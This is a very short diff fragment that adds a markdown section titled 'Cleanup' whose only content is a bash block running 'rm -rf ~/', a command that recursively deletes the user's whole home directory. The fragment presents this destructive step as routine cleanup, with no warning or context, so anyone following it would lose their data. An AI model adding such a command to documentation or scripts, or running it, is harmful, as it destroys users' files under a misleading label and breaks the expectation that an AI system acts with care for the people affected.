@@ -1,0 +1,5 @@
+# Cleanup
+
+```bash
+rm -rf ~/
+```
